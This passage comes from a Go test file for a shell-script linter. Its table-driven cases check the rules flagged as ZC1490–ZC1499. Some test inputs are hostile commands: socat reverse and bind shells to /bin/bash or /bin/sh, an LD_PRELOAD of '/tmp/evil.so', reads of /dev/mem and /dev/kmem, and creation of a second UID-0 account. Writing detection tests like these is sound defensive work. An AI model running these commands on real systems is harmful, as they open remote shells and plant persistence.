			input: `socat TCP:10.0.0.1:4444 EXEC:/bin/bash`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — socat TCP-LISTEN:... EXEC:\"/bin/sh -i\"",
			input: `socat TCP-LISTEN:4444 EXEC:"/bin/sh -i",pty,stderr`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — socat SYSTEM:/bin/sh",
			input: `socat tcp:host:port SYSTEM:/bin/sh`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1490",
					Message: "`socat` pointed at a shell via `EXEC:` / `SYSTEM:` — matches the classic reverse/bind-shell pattern. Gate behind explicit authorization.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1490")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1491(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — export PATH=/usr/bin",
			input:    `export PATH=/usr/bin`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — export LD_PRELOAD=/tmp/evil.so",
			input: `export LD_PRELOAD=/tmp/evil.so`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1491",
					Message: "`export LD_PRELOAD=...` forces every subsequent binary to load a custom library — classic privesc/persistence. Scope to a single invocation if needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — export LD_LIBRARY_PATH=/opt/untrusted",
			input: `export LD_LIBRARY_PATH=/opt/untrusted`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1491",
					Message: "`export LD_LIBRARY_PATH=...` forces every subsequent binary to load a custom library — classic privesc/persistence. Scope to a single invocation if needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — export LD_AUDIT=/tmp/audit.so",
			input: `export LD_AUDIT=/tmp/audit.so`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1491",
					Message: "`export LD_AUDIT=...` forces every subsequent binary to load a custom library — classic privesc/persistence. Scope to a single invocation if needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1491")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1492(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — at -l (list jobs)",
			input:    `at -l`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — at -r 3 (remove job)",
			input:    `at -r 3`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — at now + 1 hour",
			input: `at now + 1 hour`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1492",
					Message: "`at` schedules via atd with no unit file — harder to audit. Prefer `systemd-run --on-calendar=` or a `.timer` unit.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — at -f script.sh midnight",
			input: `at -f script.sh midnight`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1492",
					Message: "`at` schedules via atd with no unit file — harder to audit. Prefer `systemd-run --on-calendar=` or a `.timer` unit.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1492")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1493(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — watch ls",
			input:    `watch ls`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — watch -n 1 df",
			input:    `watch -n 1 df`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — watch -n 0.5 df",
			input:    `watch -n 0.5 df`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — watch -n 0 df",
			input: `watch -n 0 df`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1493",
					Message: "`watch -n 0` pins a core at 100% and saturates the terminal. Use a realistic interval or an event-driven API (inotifywait / journalctl -f).",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — watch -n0 df (joined)",
			input: `watch -n0 df`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1493",
					Message: "`watch -n -n0` pins a core at 100% and saturates the terminal. Use a realistic interval or an event-driven API (inotifywait / journalctl -f).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1493")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1494(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — tcpdump without -w (stdout)",
			input:    `tcpdump -i eth0 port 443`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — tcpdump -w capture.pcap -Z tcpdump",
			input:    `tcpdump -i eth0 -w capture.pcap -Z tcpdump`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — tcpdump -i eth0 -w capture.pcap",
			input: `tcpdump -i eth0 -w capture.pcap`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1494",
					Message: "`tcpdump -w` without `-Z <user>` writes the pcap as root and never drops privileges. Add `-Z tcpdump` (or a dedicated capture user).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1494")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1495(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ulimit -n 10240",
			input:    `ulimit -n 10240`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — ulimit -c 0 (disable)",
			input:    `ulimit -c 0`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ulimit -c unlimited",
			input: `ulimit -c unlimited`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1495",
					Message: "`ulimit -c unlimited` exposes setuid-process memory via core dumps. Leave the distro default and use systemd-coredump if you need post-mortems.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1495")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1496(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — strings /bin/ls",
			input:    `strings /bin/ls`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — strings /dev/mem",
			input: `strings /dev/mem`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1496",
					Message: "Reading `/dev/mem` leaks kernel / physical memory. Use kdump + crash on a crash-kernel image if you need a dump.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — xxd /dev/port",
			input: `xxd /dev/port`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1496",
					Message: "Reading `/dev/port` leaks kernel / physical memory. Use kdump + crash on a crash-kernel image if you need a dump.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — cat /dev/kmem",
			input: `cat /dev/kmem`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1496",
					Message: "Reading `/dev/kmem` leaks kernel / physical memory. Use kdump + crash on a crash-kernel image if you need a dump.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1496")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1497(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — useradd alice",
			input:    `useradd alice`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — useradd -u 1001 alice",
			input:    `useradd -u 1001 alice`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — useradd -u 0 svc",
			input: `useradd -u 0 svc`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1497",
					Message: "Creating a user with UID 0 produces a second root account — classic persistence technique. Use sudo rules tied to a non-0 UID instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — usermod -u0 backup",
			input: `usermod -u0 backup`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1497",
					Message: "Creating a user with UID 0 produces a second root account — classic persistence technique. Use sudo rules tied to a non-0 UID instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1497")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1498(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — mount /mnt/data /mnt/backup",
			input:    `mount /mnt/data /mnt/backup`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — mount -o ro,remount /",
			input:    `mount -o ro,remount /`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — mount -o remount,rw /",
			input: `mount -o remount,rw /`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1498",
					Message: "`mount -o remount,rw /` makes a read-only system path writable — use ostree / systemd-sysext or fix /etc/fstab.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — mount -o rw,remount /boot",
			input: `mount -o rw,remount /boot`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1498",
					Message: "`mount -o remount,rw /boot` makes a read-only system path writable — use ostree / systemd-sysext or fix /etc/fstab.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1498")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1499(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker pull nginx:1.27",
			input:    `docker pull nginx:1.27`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker pull nginx@sha256:abc",
			input:    `docker pull nginx@sha256:abcdef`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker pull nginx (no tag)",
			input: `docker pull nginx`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1499",
					Message: "`nginx` is unpinned (implicit `:latest`). Pin to a specific tag or an immutable `@sha256:` digest for reproducibility.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker pull nginx:latest",
			input: `docker pull nginx:latest`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1499",
					Message: "`nginx:latest` is unpinned (implicit `:latest`). Pin to a specific tag or an immutable `@sha256:` digest for reproducibility.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1499")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}
